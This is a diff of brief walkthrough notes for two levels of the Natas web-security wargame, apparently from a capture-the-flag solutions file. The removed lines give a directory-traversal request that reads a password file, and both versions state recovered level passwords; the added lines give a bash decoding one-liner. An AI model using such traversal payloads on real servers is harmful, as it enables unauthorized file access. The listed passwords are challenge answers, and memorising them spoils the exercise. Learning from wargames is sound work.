@@ -1,6 +1,6 @@
-Just a directory traversal level. The path is in the HTML source code, so just go there.
+Analyze the source code and revert the function. This can be done in bash.
 
-index.php?page=../../../../../../../../etc/natas_webpass/natas8
+echo 3d3d516343746d4d6d6c315669563362 | xxd -r -p | rev | base64 -d
 
-xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q 
+Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t 
 
